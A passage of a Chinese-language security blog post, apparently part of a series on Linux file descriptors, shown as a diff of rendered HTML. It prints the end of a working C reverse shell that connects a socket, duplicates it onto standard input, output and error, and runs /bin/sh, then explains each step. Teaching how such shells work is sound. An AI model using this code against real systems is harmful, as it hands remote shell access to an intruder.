+</span><span style="color:#75715e"></span>  <span style="color:#ae81ff">20</span>   <span style="color:#960050;background-color:#1e0010">│</span>        <span style="color:#66d9ef">int</span> sockfd <span style="color:#f92672">=</span> socket(AF_INET<span style="color:#75715e">/* 2 */</span>, SOCK_STREAM<span style="color:#75715e">/* 1 */</span>, <span style="color:#ae81ff">0</span>);
+  <span style="color:#ae81ff">21</span>   <span style="color:#960050;background-color:#1e0010">│</span> 
+  <span style="color:#ae81ff">22</span>   <span style="color:#960050;background-color:#1e0010">│</span>        <span style="color:#75715e">// create sockaddr_in structure for use with connect function
+</span><span style="color:#75715e"></span>  <span style="color:#ae81ff">23</span>   <span style="color:#960050;background-color:#1e0010">│</span>        <span style="color:#66d9ef">struct</span> sockaddr_in sock_in;
+  <span style="color:#ae81ff">24</span>   <span style="color:#960050;background-color:#1e0010">│</span>        sock_in.sin_family <span style="color:#f92672">=</span> AF_INET;
+  <span style="color:#ae81ff">25</span>   <span style="color:#960050;background-color:#1e0010">│</span>        sock_in.sin_addr.s_addr <span style="color:#f92672">=</span> inet_addr(address);
+  <span style="color:#ae81ff">26</span>   <span style="color:#960050;background-color:#1e0010">│</span>        sock_in.sin_port <span style="color:#f92672">=</span> htons(port);
+  <span style="color:#ae81ff">27</span>   <span style="color:#960050;background-color:#1e0010">│</span> 
+  <span style="color:#ae81ff">28</span>   <span style="color:#960050;background-color:#1e0010">│</span>        <span style="color:#75715e">// perform connect to target IP address and port
+</span><span style="color:#75715e"></span>  <span style="color:#ae81ff">29</span>   <span style="color:#960050;background-color:#1e0010">│</span>        connect(sockfd, (<span style="color:#66d9ef">struct</span> sockaddr<span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>sock_in, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> sockaddr_in));
+  <span style="color:#ae81ff">30</span>   <span style="color:#960050;background-color:#1e0010">│</span> 
+  <span style="color:#ae81ff">31</span>   <span style="color:#960050;background-color:#1e0010">│</span>        <span style="color:#75715e">// duplicate file descriptors for STDIN/STDOUT/STDERR
+</span><span style="color:#75715e"></span>  <span style="color:#ae81ff">32</span>   <span style="color:#960050;background-color:#1e0010">│</span>        <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> n <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; n <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">2</span>; n<span style="color:#f92672">++</span>)
+  <span style="color:#ae81ff">33</span>   <span style="color:#960050;background-color:#1e0010">│</span>        {
+  <span style="color:#ae81ff">34</span>   <span style="color:#960050;background-color:#1e0010">│</span>                dup2(sockfd, n);
+  <span style="color:#ae81ff">35</span>   <span style="color:#960050;background-color:#1e0010">│</span>        }
+  <span style="color:#ae81ff">36</span>   <span style="color:#960050;background-color:#1e0010">│</span> 
+  <span style="color:#ae81ff">37</span>   <span style="color:#960050;background-color:#1e0010">│</span>        <span style="color:#75715e">// execve(&#34;/bin/sh&#34;, 0, 0)
+</span><span style="color:#75715e"></span>  <span style="color:#ae81ff">38</span>   <span style="color:#960050;background-color:#1e0010">│</span>        execve(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, NULL, NULL);
+  <span style="color:#ae81ff">39</span>   <span style="color:#960050;background-color:#1e0010">│</span> 
+  <span style="color:#ae81ff">40</span>   <span style="color:#960050;background-color:#1e0010">│</span>        close(sockfd);
+  <span style="color:#ae81ff">41</span>   <span style="color:#960050;background-color:#1e0010">│</span> 
+  <span style="color:#ae81ff">42</span>   <span style="color:#960050;background-color:#1e0010">│</span>        <span style="color:#66d9ef">return</span>;
+  <span style="color:#ae81ff">43</span>   <span style="color:#960050;background-color:#1e0010">│</span> }
+  <span style="color:#ae81ff">44</span>   <span style="color:#960050;background-color:#1e0010">│</span> 
+  <span style="color:#ae81ff">45</span>   <span style="color:#960050;background-color:#1e0010">│</span> 
+  <span style="color:#ae81ff">46</span>   <span style="color:#960050;background-color:#1e0010">│</span> <span style="color:#66d9ef">int</span> main()
+  <span style="color:#ae81ff">47</span>   <span style="color:#960050;background-color:#1e0010">│</span> {
+  <span style="color:#ae81ff">48</span>   <span style="color:#960050;background-color:#1e0010">│</span>        reverse_shell();
+  <span style="color:#ae81ff">49</span>   <span style="color:#960050;background-color:#1e0010">│</span> 
+  <span style="color:#ae81ff">50</span>   <span style="color:#960050;background-color:#1e0010">│</span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+  <span style="color:#ae81ff">51</span>   <span style="color:#960050;background-color:#1e0010">│</span> }
+<span style="color:#960050;background-color:#1e0010">───────┴─────────────────────────────────────────────────────────────────────────────────</span></code></pre></div>
+<p>如果前两篇看懂的话，那么参考这个代码，reverse shell 的原理就很好理解了</p>
+
+<ol>
+<li>建立一个 socket，此时会新建一个 fd</li>
+<li>给这个 socket 分配 ip 和 port</li>
+<li>通过 dup2，将 socket 的 fd 复制到 0，1 和 2 上，这样 shell 的 io 就完全通过建立的 socket 了，这时如果我们监听这个 ip 和 port，就相当于拿到了一个 shell</li>
+</ol>
+
+<h2 id="references">References</h2>
+
+<p><a href="https://lordidiot.github.io/2018-09-03/tokyowesterns-ctf-2018-load-pwn/">https://lordidiot.github.io/2018-09-03/tokyowesterns-ctf-2018-load-pwn/</a>
+<a href="http://nano-chicken.blogspot.com/2014/07/linuxttyptypts.html">http://nano-chicken.blogspot.com/2014/07/linuxttyptypts.html</a>
+<a href="https://segmentfault.com/a/1190000009082089">https://segmentfault.com/a/1190000009082089</a>
+<a href="http://shell-storm.org/shellcode/files/shellcode-219.php">http://shell-storm.org/shellcode/files/shellcode-219.php</a>
+<a href="http://tacxingxing.com/2018/01/19/procfs/">http://tacxingxing.com/2018/01/19/procfs/</a>
+<a href="https://tdmathison.github.io/blog/slae32-1/">https://tdmathison.github.io/blog/slae32-1/</a>
+<a href="https://tdmathison.github.io/blog/slae32-2/">https://tdmathison.github.io/blog/slae32-2/</a>
+<a href="https://xz.aliyun.com/t/2548">https://xz.aliyun.com/t/2548</a>
+<a href="https://xz.aliyun.com/t/2549">https://xz.aliyun.com/t/2549</a></p>
+
+
+</article>
+
+
+<section class="post-nav">
+    <ul>
+        
+        <li>
+            <a href="https://0x01f.github.io/post/play_with_file_descriptor_2/"><i class="fa fa-chevron-circle-left"></i> Play with file descriptor(II)</a>
+        </li>
+        
+        
+    </ul>
+</section>
+<head>
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+</head>
+<body>
+    <div id="vcomments"></div>
+    <script>
+        new Valine({
+            el: '#vcomments',
+            appId: 'goABwRBvfqsbEkzfPSjlbhDJ-gzGzoHsz',
+            appKey: 'jm5HSLcqP40fvEBMOcBwPXPE',
+            notify:false,
+            verify:true,
+            avatar:'wavatar',
+            vistor:true,
+            placeholder: 'Leave a comment',
+            path:window.location.pathname
+        })
+    </script>
+</body>
+
+
+
+
+
+</main>
+    <footer>
+        <h6>Copyright &copy; 2018 - M4x | 
+            Rendered by <a href="https://gohugo.io" title="Hugo">Hugo</a> |
+            <a href="https://0x01f.github.io/index.xml">Subscribe</a></h6>
+    </footer>
+</div>
+<script src="https://0x01f.github.io/js/scripts.js"></script>
+</body>
+
+</html>
